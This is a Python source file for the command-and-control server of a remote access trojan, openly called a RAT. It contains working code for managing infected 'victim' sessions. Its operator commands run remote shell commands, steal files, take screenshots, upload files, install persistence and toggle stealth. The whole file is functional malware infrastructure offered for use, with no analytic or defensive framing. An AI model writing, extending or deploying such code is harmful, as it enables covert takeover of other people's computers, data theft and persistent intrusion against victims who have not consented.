import socket
import threading
import cmd
import json
import zlib
import hashlib
import os
import time
from pathlib import Path
from datetime import datetime


class RatC2(cmd.Cmd):
    prompt = 'RAT> '

    def __init__(self, host, port):
        super().__init__()
        self.sessions = {}
        self.current_session = None
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((host, port))
        self.listener.listen(5)
        self.running = True
        self.log_file = "c2_operations.log"

        threading.Thread(target=self.accept_connections, daemon=True).start()
        threading.Thread(target=self.heartbeat_check, daemon=True).start()
        self._log("C2 Server Started")

    def _log(self, message):
        """Log operations with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] {message}\n")

    def _receive_data(self, conn, timeout=30):
        """Receive length-prefixed data with timeout"""
        try:
            conn.settimeout(timeout)
            raw_len = conn.recv(4)
            if not raw_len:
                return None
            msg_len = int.from_bytes(raw_len, 'big')
            data = bytearray()
            while len(data) < msg_len:
                packet = conn.recv(min(4096, msg_len - len(data)))
                if not packet:
                    return None
                data.extend(packet)
            return bytes(data)
        except Exception as e:
            self._log(f"Receive error: {str(e)}")
            return None

    def _send_data(self, conn, data):
        """Send length-prefixed data"""
        try:
            if isinstance(data, str):
                data = data.encode()
            conn.sendall(len(data).to_bytes(4, 'big') + data)
            return True
        except Exception as e:
            self._log(f"Send error: {str(e)}")
            return False

    def accept_connections(self):
        """Handle incoming connections with protocol handshake"""
        while self.running:
            try:
                print(f"[*] Listening on {self.listener.getsockname()}")
                client, addr = self.listener.accept()
                print(f"[+] Incoming connection from {addr}")
                client.settimeout(10)

                # Receive session ID
                session_id = self._receive_data(client).decode()
                if not session_id:
                    client.close()
                    continue

                # Receive system info
                info_data = self._receive_data(client)
                if not info_data:
                    client.close()
                    continue

                try:
                    info = json.loads(info_data.decode())
                except json.JSONDecodeError:
                    client.close()
                    continue

                self.sessions[session_id] = {
                    'socket': client,
                    'address': addr,
                    'info': info,
                    'last_seen': time.time()
                }

                self._log(f"New session: {session_id[:6]} from {addr[0]}")
                print(f"\n[+] New session {session_id[:6]} ({info['os']} - {info['hostname']})")

                if not self.current_session:
                    self.do_switch(session_id[:6])

            except Exception as e:
                if self.running:
                    self._log(f"Connection error: {str(e)}")

    def do_sessions(self, arg):
        """List all active sessions"""
        print("\nActive Sessions:")
        for sid, session in self.sessions.items():
            info = session['info']
            status = "Active" if time.time() - session['last_seen'] < 60 else "Stale"
            print(f" {sid[:6]} | {info['os']:7} | {info['hostname']:15} | {status}")

    def do_switch(self, arg):
        """Switch active session: switch <session_id_prefix>"""
        if not arg:
            print("Current session:", self.current_session[:6] if self.current_session else "None")
            return

        matches = [sid for sid in self.sessions if sid.startswith(arg)]
        if not matches:
            print("No matching sessions")
            return

        if len(matches) > 1:
            print("Multiple matches:")
            for sid in matches:
                print(f" - {sid[:6]}")
            return

        self.current_session = matches[0]
        info = self.sessions[self.current_session]['info']
        self.prompt = f"RAT ({info['hostname']})> "
        print(f"Switched to session {self.current_session[:6]}")

    def do_shell(self, arg):
        """Execute command on victim: shell <command>"""
        if not self._validate_session():
            return

        response = self._send_command(f"CMD {arg}")
        if response:
            print(response.decode())

    def do_download(self, arg):
        """Download file from victim: download <remote_path>"""
        if not self._validate_session():
            return

        response = self._send_command(f"DL {arg}")
        if response and response.decode() == "READY":
            self._receive_file(arg.split('/')[-1])

    def do_upload(self, arg):
        """Upload file to victim: upload <local_path> <remote_path>"""
        if not self._validate_session():
            return

        try:
            local, remote = arg.split(maxsplit=1)
            if not Path(local).exists():
                print("Local file not found")
                return

            response = self._send_command(f"UL {remote}")
            if response and response.decode() == "READY":
                self._send_file(local)
        except ValueError:
            print("Usage: upload <local_path> <remote_path>")

    def do_screenshot(self, arg):
        """Take and download screenshot: screenshot [filename]"""
        if not self._validate_session():
            return

        filename = arg or f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        response = self._send_command("SCREENSHOT")
        if response and response.decode() == "READY":
            self._receive_file(filename)

    def do_persist(self, arg):
        """Install persistence mechanism: persist [method]"""
        if not self._validate_session():
            return

        response = self._send_command(f"PERSIST {arg}")
        print(response.decode())

    def do_stealth(self, arg):
        """Toggle stealth mode: stealth <on|off>"""
        if not self._validate_session():
            return

        response = self._send_command(f"STEALTH {arg.lower()}")
        print(response.decode())

    def do_kill(self, arg):
        """Remove RAT from victim: kill"""
        if not self._validate_session():
            return

        self._send_command("KILL")
        print("Sent kill command")
        self.sessions.pop(self.current_session, None)
        self.current_session = None

    def _send_command(self, cmd):
        """Send command and return response"""
        try:
            client = self.sessions[self.current_session]['socket']
            if not self._send_data(client, cmd):
                return None
            return self._receive_data(client)
        except Exception as e:
            print(f"Command failed: {str(e)}")
            return None

    def _send_file(self, local_path):
        """Secure file upload with verification"""
        client = self.sessions[self.current_session]['socket']
        try:
            file_hash = self._calculate_hash(local_path)
            file_size = os.path.getsize(local_path)
            metadata = json.dumps({
                'name': os.path.basename(local_path),
                'size': file_size,
                'hash': file_hash
            })

            if not self._send_data(client, metadata):
                return

            ack = self._receive_data(client)
            if ack != b"ACK":
                print("Upload aborted")
                return

            with open(local_path, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    compressed = zlib.compress(chunk)
                    if not self._send_data(client, compressed):
                        break

            verification = self._receive_data(client)
            if verification.decode() == file_hash:
                print(f"File {local_path} uploaded successfully")
                self._log(f"File uploaded: {local_path}")
            else:
                print("Upload verification failed")

        except Exception as e:
            print(f"Upload failed: {str(e)}")

    def _receive_file(self, filename):
        """Secure file download with validation"""
        client = self.sessions[self.current_session]['socket']
        try:
            metadata = json.loads(self._receive_data(client).decode())
            if not self._send_data(client, b"ACK"):
                return

            received = 0
            file_hash = hashlib.sha256()
            with open(filename, 'wb') as f:
                while received < metadata['size']:
                    data = self._receive_data(client)
                    if not data:
                        break
                    chunk = zlib.decompress(data)
                    f.write(chunk)
                    file_hash.update(chunk)
                    received += len(chunk)

            if file_hash.hexdigest() == metadata['hash']:
                print(f"File {filename} downloaded ({metadata['size']} bytes)")
                self._log(f"File downloaded: {filename}")
            else:
                os.remove(filename)
                print("Download verification failed")

        except Exception as e:
            print(f"Download failed: {str(e)}")

    def _calculate_hash(self, path):
        """Calculate SHA-256 hash of file"""
        sha = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sha.update(chunk)
        return sha.hexdigest()

    def heartbeat_check(self):
        """Maintain active connections and remove dead sessions"""
        while self.running:
            dead_sessions = []
            for sid, session in self.sessions.items():
                try:
                    if time.time() - session['last_seen'] > 120:
                        session['socket'].close()
                        dead_sessions.append(sid)
                    else:
                        self._send_data(session['socket'], "PING")
                        pong = self._receive_data(session['socket'], timeout=5)
                        if pong == b"PONG":
                            session['last_seen'] = time.time()
                except:
                    dead_sessions.append(sid)

            for sid in dead_sessions:
                self.sessions.pop(sid, None)
                self._log(f"Session expired: {sid[:6]}")
                if sid == self.current_session:
                    self.current_session = None

            time.sleep(30)

    def _validate_session(self):
        """Check if current session is valid"""
        if not self.current_session:
            print("No active session selected")
            return False
        if self.current_session not in self.sessions:
            print("Session no longer exists")
            self.current_session = None
            return False
        return True

    def do_exit(self, arg):
        """Exit C2 server gracefully"""
        self.running = False
        for sid in list(self.sessions.keys()):
            self.sessions[sid]['socket'].close()
        self.listener.close()
        self._log("C2 Server Stopped")
        return True

    def emptyline(self):
        pass


if __name__ == '__main__':
    print("Starting Advanced RAT C2 Server...")
    RatC2('0.0.0.0', 443).cmdloop()